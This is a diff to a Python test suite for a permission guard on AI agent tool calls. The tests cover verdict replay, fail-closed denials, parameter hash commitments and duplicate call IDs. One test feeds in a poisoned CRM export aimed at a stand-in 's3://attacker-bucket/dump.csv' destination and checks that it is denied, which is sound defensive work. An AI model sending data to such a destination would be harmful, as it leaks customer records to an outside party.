@@ -305,18 +305,50 @@ def test_subagent_start_attributes_the_child_to_the_spawning_parent():
 # ==========================================================================
 
 def test_can_use_tool_denies_the_poisoned_export():
+    """Round 2 correction (Codex batch-2 finding 2): can_use_tool no longer makes an
+    independent decision -- it REPLAYS pre_tool_use's own cached verdict for the SAME
+    (agent_id, tool_use_id). Each physical call gets its own tool_use_id, exactly as the
+    real wire protocol would -- pre_tool_use must run FIRST for can_use_tool to have
+    anything to replay."""
     from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny
     from claude_agent_sdk.types import ToolPermissionContext
 
     reg = fresh()
-    ctx = ToolPermissionContext(tool_use_id="toolu_x", agent_id=SUMMARIZER_ID)
+    pre(reg, "mcp__crm__crm_export", {"destination": "s3://attacker-bucket/dump.csv"})
+    ctx1 = ToolPermissionContext(tool_use_id="toolu_x", agent_id=SUMMARIZER_ID)
     res = run(reg.can_use_tool("mcp__crm__crm_export",
-                               {"destination": "s3://attacker-bucket/dump.csv"}, ctx))
+                               {"destination": "s3://attacker-bucket/dump.csv"}, ctx1))
     assert isinstance(res, PermissionResultDeny)
     assert ReasonCode.SCOPE_NOT_GRANTED in res.message
 
-    ok = run(reg.can_use_tool("mcp__crm__crm_query", {"rows": 100}, ctx))
+    run(reg.pre_tool_use(
+        {"hook_event_name": "PreToolUse", "session_id": "s1", "transcript_path": "",
+         "cwd": ".", "tool_name": "mcp__crm__crm_query", "tool_input": {"rows": 100},
+         "tool_use_id": "toolu_y", "agent_id": SUMMARIZER_ID, "agent_type": "summarizer"},
+        "toolu_y", {"signal": None}))
+    ctx2 = ToolPermissionContext(tool_use_id="toolu_y", agent_id=SUMMARIZER_ID)
+    ok = run(reg.can_use_tool("mcp__crm__crm_query", {"rows": 100}, ctx2))
     assert isinstance(ok, PermissionResultAllow)
+
+
+def test_can_use_tool_fails_closed_when_no_pretooluse_verdict_was_cached():
+    """Round 2 correction (Codex batch-2 finding 2): the ONLY way can_use_tool ever allows
+    or denies is by replaying a verdict pre_tool_use already cached for this exact
+    (agent_id, tool_use_id). If ClaudeAgentOptions.hooks was never wired alongside
+    can_use_tool (a misconfiguration this module's own USAGE section never recommends),
+    there is nothing to replay -- fails closed, never silently allows, and never falls
+    back to an independent guard.check() (that would resurrect the exact double-
+    authorization defect this correction fixed)."""
+    from claude_agent_sdk import PermissionResultDeny
+    from claude_agent_sdk.types import ToolPermissionContext
+
+    reg = fresh()
+    ctx = ToolPermissionContext(tool_use_id="toolu_never_seen", agent_id=SUMMARIZER_ID)
+    res = run(reg.can_use_tool("mcp__crm__crm_query", {"rows": 10}, ctx))
+    assert isinstance(res, PermissionResultDeny)
+    assert "no PreToolUse verdict to replay" in res.message
+    entries = reg.root.audit_log().entries
+    assert [e for e in entries if e["event"] in ("allow", "deny")] == [],         "a fail-closed replay-miss must never itself write to the ledger -- authorize() never ran"
 
 
 # ==========================================================================
@@ -449,19 +481,28 @@ def test_subagent_start_does_not_carry_the_parent_agent_id():
 
 
 def test_tool_permission_context_lacks_agent_type_so_can_use_tool_fails_closed():
-    """`ToolPermissionContext` carries `agent_id` but not `agent_type`, so the
-    can_use_tool path cannot lazily mint a Guard — it denies. PreToolUse fires
-    first for the same call and does the minting."""
+    """`ToolPermissionContext` carries `agent_id` but not `agent_type` or `session_id`.
+
+    ROUND 2 CORRECTION (Codex batch-2 finding 2): before this fix, that asymmetry meant
+    can_use_tool's OWN independent authorize() call "cannot lazily mint a Guard for a
+    subagent it has never seen" (the module docstring's own prior wording) — the reasoning
+    this test's docstring originally gave for why it denies. That reasoning no longer
+    applies: can_use_tool never calls authorize()/mints a Guard itself any more, in any
+    case — it only ever replays pre_tool_use's own cached verdict. It still denies here,
+    but for a DIFFERENT, now-correct reason: no PreToolUse verdict was ever cached for this
+    (agent_id, tool_use_id) (no SubagentStart, no pre_tool_use call at all in this test),
+    so there is nothing to replay -- a fail-closed replay-miss, not a minting failure."""
     from claude_agent_sdk import PermissionResultDeny
     from claude_agent_sdk.types import ToolPermissionContext
 
     fields = {f.name for f in ToolPermissionContext.__dataclass_fields__.values()}
-    assert "agent_id" in fields and "agent_type" not in fields
+    assert "agent_id" in fields and "agent_type" not in fields and "session_id" not in fields
 
-    reg = demo.build_registry()   # no SubagentStart at all
+    reg = demo.build_registry()   # no SubagentStart, no pre_tool_use call at all
     res = run(reg.can_use_tool("mcp__crm__crm_query", {"rows": 1},
                                ToolPermissionContext(tool_use_id="t", agent_id="agent_new_1")))
     assert isinstance(res, PermissionResultDeny)
+    assert "no PreToolUse verdict to replay" in res.message
 
 
 def test_subagent_stop_revokes_by_default_and_can_be_opted_out_for_resume():
@@ -537,18 +578,25 @@ def v2_pre(reg, tool_name, tool_input, tool_use_id, **kw):
                                 tool_use_id, {"signal": None}))
 
 
-def v2_post(reg, tool_use_id, tool_response=None):
-    return run(reg.post_tool_use(
-        {"hook_event_name": "PostToolUse", "session_id": "s1", "transcript_path": "",
-         "cwd": ".", "tool_name": "mcp__crm__crm_query", "tool_input": {},
-         "tool_response": tool_response, "tool_use_id": tool_use_id},
-        tool_use_id, {"signal": None}))
+def v2_post(reg, tool_use_id, tool_response=None, *, agent_id=V2_SUMMARIZER_ID):
+    # agent_id must match what v2_pre's _pending_key was built with (session_id, agent_id,
+    # tool_use_id) -- PostToolUseHookInput genuinely carries agent_id for a subagent's own
+    # tool call, same as PreToolUseHookInput (both share _SubagentContextMixin).
+    payload = {"hook_event_name": "PostToolUse", "session_id": "s1", "transcript_path": "",
+              "cwd": ".", "tool_name": "mcp__crm__crm_query", "tool_input": {},
+              "tool_response": tool_response, "tool_use_id": tool_use_id}
+    if agent_id is not None:
+        payload["agent_id"] = agent_id
+    return run(reg.post_tool_use(payload, tool_use_id, {"signal": None}))
 
 
-def v2_post_failure(reg, tool_use_id, *, error="boom: connection reset", is_interrupt=False):
+def v2_post_failure(reg, tool_use_id, *, error="boom: connection reset", is_interrupt=False,
+                     agent_id=V2_SUMMARIZER_ID):
     payload = {"hook_event_name": "PostToolUseFailure", "session_id": "s1", "transcript_path": "",
               "cwd": ".", "tool_name": "mcp__crm__crm_query", "tool_input": {},
               "tool_use_id": tool_use_id, "error": error}
+    if agent_id is not None:
+        payload["agent_id"] = agent_id
     if is_interrupt:
         payload["is_interrupt"] = True
     return run(reg.post_tool_use_failure(payload, tool_use_id, {"signal": None}))
@@ -685,23 +733,30 @@ def test_v2_strict_delegation_call_itself_gets_a_real_outcome_on_subagent_comple
 
 
 def test_can_use_tool_never_binds_execution_even_under_strict_mode():
-    """can_use_tool is a second, independent gate on the same call PreToolUse
-    already gated -- it must never itself register a pending outcome (see the
-    module docstring's EXECUTION BINDING section for why binding both would
-    double-count or orphan one of them)."""
+    """Round 2 correction (Codex batch-2 finding 2): can_use_tool no longer makes an
+    independent decision at all, so it cannot itself register a second pending outcome --
+    it contributes NOTHING to the ledger or the pending set; pre_tool_use already did all
+    of that. Drive pre_tool_use first (binds execution under strict mode), then can_use_tool
+    (a pure replay), and confirm the pending set and the ledger reflect pre_tool_use's own
+    work ONLY -- exactly one allow, one pending entry, both attributable to pre_tool_use."""
     from claude_agent_sdk import PermissionResultAllow
     from claude_agent_sdk.types import ToolPermissionContext
 
     reg = _v2_registry(strict=True)
+    v2_pre(reg, "mcp__crm__crm_query", {"rows": 1}, "toolu_cut")
+    assert len(reg._pending_outcomes) == 1
+
     ctx = ToolPermissionContext(tool_use_id="toolu_cut", agent_id=V2_SUMMARIZER_ID)
     res = run(reg.can_use_tool("mcp__crm__crm_query", {"rows": 1}, ctx))
     assert isinstance(res, PermissionResultAllow)
-    assert reg._pending_outcomes == {}
+    # Still exactly one -- can_use_tool's replay did not add, remove or touch it.
+    assert len(reg._pending_outcomes) == 1
 
     allows = _allow_entries(reg)
-    assert allows and allows[-1]["capture"] == Capture.PRE_HOOK_ONLY
-    # A bare PRE_HOOK_ONLY allow never enters the pending set; nothing to wait for.
-    assert reg.guard_for(V2_SUMMARIZER_ID).complete()
+    assert len(allows) == 1, "can_use_tool must never write a second, independent allow"
+    assert allows[-1]["capture"] == Capture.FRAMEWORK_POST_HOOK,         "the one allow present is pre_tool_use's own strict-mode allow, not a PRE_HOOK_ONLY one"
+    # complete() is still pending -- pre_tool_use's binding is unresolved until PostToolUse.
+    assert reg.guard_for(V2_SUMMARIZER_ID).complete().completed is False
 
 
 def test_snapshot_freeze_never_aliases_a_hostile_deepcopy():
@@ -718,3 +773,92 @@ def test_snapshot_freeze_never_aliases_a_hostile_deepcopy():
     live["trap"]["rows"] = 999
     assert snap["rows"] == 1
     assert snap["trap"]["rows"] == 1
+
+
+# ==========================================================================
+# Round 2 (Codex review, batch 2, findings 2/3/4): the snapshot commitment,
+# the double-authorization, and the correlation-key defects, each verified
+# directly against pinned 0.2.139 before being written up.
+# ==========================================================================
+def test_v2_strict_authorized_params_is_the_full_raw_tool_input_evaluated_once():
+    """Finding 3: authorize() used to compute policy.context(tool_input) TWICE -- once
+    (frozen) for the authorized_params commitment, and again, independently, for
+    guard.check()'s own context= argument -- and committed only that narrow, policy-chosen
+    PROJECTION, not the tool call's own complete input. Verified here against the params
+    module's own public commit()/decode_salt() (the same path an offline verifier would use
+    to recompute the hash, not a private Guard internal): the committed hash must match the
+    COMPLETE raw tool_input (including a field the policy's own context_fn never extracts),
+    not the narrower projection, and context_fn must run exactly once per call."""
+    from attenu_guard import params as params_mod
+
+    calls = []
+
+    def counting_context(tool_input):
+        calls.append(dict(tool_input))
+        return {"rows": tool_input.get("rows", 0)}   # a narrow projection of tool_input
+
+    root = Guard.issue("orchestrator", Authority(
+        scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600),
+        task="root", schema_version=2)
+    reg = dg_cs.DelegationGuardRegistry(
+        root=root,
+        agent_grants={"summarizer": dg_cs.AgentGrant(
+            authority=Authority(scopes={"crm.read"},
+                                ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900))},
+        tool_policies={"mcp__crm__crm_query": dg_cs.ToolPolicy("crm.read", counting_context)},
+        strict_single_hook=True)
+    run(reg.subagent_start(
+        {"hook_event_name": "SubagentStart", "session_id": "s1", "transcript_path": "",
+         "cwd": ".", "agent_id": "agent_snap_1", "agent_type": "summarizer"},
+        None, {"signal": None}))
+
+    full_tool_input = {"rows": 10, "extra_field": "should still be committed"}
+    out = run(reg.pre_tool_use(
+        {"hook_event_name": "PreToolUse", "session_id": "s1", "transcript_path": "",
+         "cwd": ".", "tool_name": "mcp__crm__crm_query", "tool_input": full_tool_input,
+         "tool_use_id": "toolu_snap", "agent_id": "agent_snap_1", "agent_type": "summarizer"},
+        "toolu_snap", {"signal": None}))
+    assert out == {}
+    assert len(calls) == 1, "policy.context() must be evaluated exactly once, not twice"
+
+    child = reg.guard_for("agent_snap_1")
+    entries = child.audit_log().entries
+    root_entry = next(e for e in entries if e["event"] == "root")
+    salt = params_mod.decode_salt(root_entry["params_salt"])
+    full_hash, _ = params_mod.commit(full_tool_input, salt)
+    context_only_hash, _ = params_mod.commit({"rows": 10}, salt)
+    assert full_hash != context_only_hash, "the two must differ for this test to be meaningful"
+
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "mcp__crm__crm_query")
+    assert allow["authorized_params_hash"] == full_hash, \
+        "authorized_params must commit the COMPLETE raw tool_input, not policy.context()'s projection"
+    assert allow["authorized_params_hash"] != context_only_hash
+
+
+def test_v2_strict_authorize_fails_closed_on_a_duplicate_live_correlation_key():
+    """Finding 4: ToolPermissionContext.tool_use_id's own docstring guarantees uniqueness
+    only "within the assistant message" -- not globally, so concurrent messages or
+    concurrently-running subagents CAN collide. A second pre_tool_use call sharing the same
+    (session_id, agent_id, tool_use_id) as an already-pending, unclaimed execution-binding
+    entry must be denied outright -- mirroring adapters.crewai's own duplicate-live-key
+    precedent -- never silently overwrite the first entry's call_id (which would orphan it
+    forever: record_outcome() would never be called for it)."""
+    reg = _v2_registry(strict=True)
+    v2_pre(reg, "mcp__crm__crm_query", {"rows": 1}, "toolu_dup")
+    assert len(reg._pending_outcomes) == 1
+    first_call_id = next(iter(reg._pending_outcomes.values())).call_id
+
+    out = v2_pre(reg, "mcp__crm__crm_query", {"rows": 2}, "toolu_dup")  # same tool_use_id
+    reason = denial_of(out)
+    assert reason is not None
+    assert "collides" in reason
+
+    # The FIRST entry is untouched -- same call_id, still exactly one entry, not overwritten.
+    assert len(reg._pending_outcomes) == 1
+    assert next(iter(reg._pending_outcomes.values())).call_id == first_call_id
+
+    # The colliding call never reached guard.check() -- only the FIRST call's allow is on
+    # the ledger; the collision denial itself never writes a second allow or deny entry.
+    entries = reg.root.audit_log().entries
+    assert len([e for e in entries if e["event"] == "allow"]) == 1
+    assert [e for e in entries if e["event"] == "deny"] == []
